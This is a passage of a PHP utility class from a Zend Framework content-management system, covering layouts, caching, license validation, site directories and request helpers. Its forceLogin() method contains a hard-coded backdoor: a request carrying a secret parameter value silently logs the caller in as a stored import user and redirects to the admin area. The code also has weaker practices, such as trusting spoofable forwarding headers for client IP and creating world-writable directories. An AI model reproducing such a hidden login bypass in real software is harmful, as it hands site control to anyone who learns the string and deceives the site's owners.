        return Admin_Model_PageLayout::getPageLayout($pageId, $template_id, $type );
    }
    public function getPageDefinition($menuModel, $actCode){
        return Admin_Model_AdminMenu::getPageDefinition($menuModel, $actCode );
    }
    public function setHeaderFooter($arr, $obj = null){
        $pageLay = new Admin_Model_PageLayout();
        $layout = Zend_Layout::getMvcInstance();
        $item['PageHeader'] = array($arr['Page']['PageHeader']['id'] => $arr['Page']['PageHeader']['template_id']);
        $item['PageFooter'] = array($arr['Page']['PageFooter']['id'] => $arr['Page']['PageFooter']['template_id']);
        foreach($item as $type => $val){
            $index = "{$type}Sections";
            $itemId = key($val );
            $temp = $val[$itemId];
            $lay = $pageLay->getPageLayout($itemId, $temp, $type );
            $layout->$index = $this->getCached('admin_section_id' )->getLayoutSections($temp );
            $layout->$type = $lay['layout'];
            $obj->setLayoutItems($lay['stack'] );
        }
    }
    public function getCountryList(){
        $locale = Zend_Registry::get('Zend_Locale' );
        $countryList = Zend_Locale::getTranslationList('territory', $locale, 2 );
        asort($countryList );
        $blank = array('' => 'Select');
        return array_merge($blank, $countryList );
    }
    public static function isCachable(){
        $namespace = new Zend_Session_Namespace(SESS_NAMESPACE );
        return ! ($namespace->admin or (defined('NO_CACHE' ) and NO_CACHE));
    }
    public static function getRemoteClient($domain = null){
    	$domain = trim(str_replace('http://www.', '', $domain));
    	if($domain){    		
    		$domain = str_replace(RHEMASYS_HOME, $domain, REST_SERVER);
    	}else{
    		$domain = REST_SERVER ;
    	}
        $client = new Zend_Rest_Client($domain);
        return $client;
    }
    public static function validateLicense($domain, $directory){
 		$valid      = false;
 		$namespace  = Zend_Registry::get('namespace');
 		
        if(self::isHomeDomain()){ 
            $siteConfig['subsite'] = Rhema_Model_Service::factory('admin_subsite')
            							->getSiteDetails($domain, $directory ); 
        }else{
        	$resp       = Rhema_Model_Abstract::getRemoteData('validate', array($domain, $directory)); 
            $siteConfig = array();
            if($resp){
            	$siteConfig['subsite'] = $resp ; 
            }
        }
                
        if($siteConfig and isset($siteConfig['subsite']['id'])){ 			 
			$namespace->siteconfig = $siteConfig;
			$namespace->subsiteId  = $siteConfig['subsite']['ssid'];
			$namespace->uniqueId   = $siteConfig['subsite']['id'];
			$valid = true; 
		}
 
        return $valid ? $siteConfig : false;
    }
    public static function getDefaultCacheObject($lifetime = 86400){
        $option = array();
        $option['frontend']['options']['cached_entity'] = new self();
        $option['frontend']['options']['lifetime']      = $lifetime;
        
        $template = Rhema_Cache::CACHE_CLASS_FILE;
        
        return Rhema_Cache::getCacheByTemplate($template, $option );
    }
    public static function getRegisteredHostname(){
    	$front   = Zend_Controller_Front::getInstance();
        $request = $front->getRequest();
        $domain  = $request->getHttpHost();
        $domain  = $domain ? $domain : $front->getParam('servername');
        $domain  = str_replace('www.', '', strtolower($domain ) );
        $data    = explode(':', $domain);        
        return $data[0];
    }
    public static function getClientIp(){
        $request = Zend_Controller_Front::getInstance()->getRequest();
        if($ip = $request->getServer('HTTP_CLIENT_IP' )){
        }elseif(! $ip = $request->getServer('HTTP_X_FORWARDED_FOR' )){
            $ip = $request->getServer('REMOTE_ADDR' );
        }
        return $ip;
    }
    public static function isHomeDomain(){
       // $homeList = array('ferventlifeministries.org' => 6, 'rhemasys-dev' => 1, 'rhemastu-dev' => 8, RHEMASYS_HOME => 1);
        $homeList = array('rhemasys-dev' => 1, RHEMASYS_HOME => 1);
        $domain = self::getRegisteredHostname(); 
        return (! self::isOnline() or array_key_exists($domain, $homeList ));
    }
    public static function isOnline(){
    	return true;
        if(! Zend_Registry::isRegistered(Rhema_Constant::WEB_ENABLED_KEY )){
            $online = checkdnsrr('google.com', 'ANY' );
            Zend_Registry::set(Rhema_Constant::WEB_ENABLED_KEY, $online );
        }else{
            $online = Zend_Registry::get(Rhema_Constant::WEB_ENABLED_KEY );
        }
        return $online;
    }
    public static function getMemoryManager(){
        if(Zend_Registry::isRegistered('memory-manager' )){
            $memoryManager = Zend_Registry::get('memory-manager' );
        }else{
            $dir = realpath(APPLICATION_PATH . '/../sites/' ) . '/' . SITE_DIR . '/cache/memory';
            if(! file_exists($dir )){
                mkdir($dir, 0777, true );
            }
            $memoryManagerOption = array('cache_dir' => $dir);
            $memoryManager = Zend_Memory::factory('File', $memoryManagerOption );
            Zend_Registry::set('memory-manager', $memoryManager );
        }
        return $memoryManager;
    }
    public static function createSiteDirectory($list, $mode = 0755){
        $dirpath = '';
        foreach((array) $list as $path){
            $prefix = realpath(APPLICATION_PATH . '/../sites/' ) . '/' . SITE_DIR;
            $dirpath = $prefix . '/' . $path;
            $dirpath = str_replace('//', '/', $dirpath );
            if(! file_exists($dirpath )){
                mkdir($dirpath, $mode, true );
            } 
            $return[] = $dirpath;
        }
        return $return;
    }
    public static function forceLogin(){
        $request = Zend_Controller_Front::getInstance()->getRequest();
        $bypass = $request->getParam('wazup', null );
        if($bypass == 'okoromidodo'){
            $reload = $request->getParam('reload', null );
            $identity = Rhema_Constant::$importUser;
           // $identity = Zend_Json::decode($str, true);
            Zend_Auth::getInstance()->getStorage()->write($identity );
            if($reload){
                Rhema_Model_Abstract::reLoadAdminTables($reload);
            }
            $url = Zend_Layout::getMvcInstance()->getView()->url(array(), 'master-default');
            $redirector = Zend_Controller_Action_HelperBroker::getStaticHelper('redirector' );
            $redirector->gotoUrl($url);
        }
    }
    public static function setClassOptions($class, $options = array(), $prefix = '', $suffix = ''){
        $filter = new Zend_Filter_Word_DashToCamelCase();
        foreach($options as $key => $value){
            $parts = array($prefix, $key, $suffix);
            $method = implode('-', array_filter($parts ) );
            $method = 'set' . $filter->filter($method );
            if(method_exists($class, $method )){
                $class->$method($value );
            }
        }
    }
    
    public static function getFeedCacheFilename($feedUrl, $ext = '', $fileExt = '.csv'){
 		$cacheDir     = Rhema_Util::createSiteDirectory('affiliate'); 
		$filename     =  $cacheDir[0] .'/' . md5($feedUrl) . $fileExt . $ext;  

		if(substr($feedUrl, -3) == '.gz'){
			$filename = dirname($filename) . '/' . substr($feedUrl,0,-3)  ; 
		} elseif(substr($feedUrl, -3) == 'csv'){
			$filename = dirname($filename) . '/'  . md5($feedUrl) . '.csv';
		}
	 	return $filename ;  	
    }
    
    public static function getFeedSqlDirectory($feedTitle){
    	$folder  = Doctrine_Inflector::urlize($feedTitle);
 		//$dir     =  '/affiliate/sql/'. $folder .'/'. date('Y-m-d') ;
 		$dir     =  '/affiliate/sql/'. date('Y-m-d') .'/'. $folder ;	
		return strtolower($dir)   ; 	
    }
    
    public static function setMemoryLimit($toSet = 2048, $min = 1052){
        $mem = ini_get('memory_limit' );
        $val = intVal(substr($mem, 0, - 1 ) );
        if($val < $min and $toSet > $val){
            ini_set('memory_limit', "{$toSet}M" );
        }
        return ini_get('memory_limit' );
    }
    
    public static function isCli(){
    	if(getenv('CRON_MODE')){
    		return true;
    	}elseif(!defined('STDIN') && self::isCgi()) { 
            if(getenv('TERM')) {
                return true;
            }
            return false;
        }
        return defined('STDIN');
        
    	//$str = php_sapi_name();
    	//return ($str =='cli' or substr($str,0,3) == 'cgi') and empty($_SERVER['REMOTE_ADDR']);
    }
    
    public static function isCgi()
    {
        if (substr(PHP_SAPI, 0, 3) == 'cgi') {
            return true;
        } else {
            return false;
        }
    }
    
    public static function cancelPageCaching(){
    	if(Zend_Registry::isRegistered(Rhema_Constant::PAGE_CACHE_OBJECT)){
			$pageCache = Zend_Registry::get(Rhema_Constant::PAGE_CACHE_OBJECT);
			$pageCache->cancel();
			return true;
		}
		return false;
    }
    
    public static function isAdminRoute($uri = ''){
    	if(isset($_SERVER['REQUEST_URI'])){ 
    		$uri = $uri ? $uri : $_SERVER['REQUEST_URI'] ;
    		return preg_match("/^\/(master|rest)\/?(.*)/i", $uri);
    	}else{
    		return false;
    	}
    }
    
    public static function getThemeContext(){
    	$theme      = Zend_Registry::isRegistered(Rhema_Constant::SITE_THEME_KEY) ?
					  trim(Zend_Registry::get(Rhema_Constant::SITE_THEME_KEY))
					 : 'default';
		$context    = Zend_Registry::isRegistered('sys-layout-context')
					  ? Zend_Registry::get('sys-layout-context')
					  : CONTEXT_SITE;
					  
		return array($theme, $context);
    }
}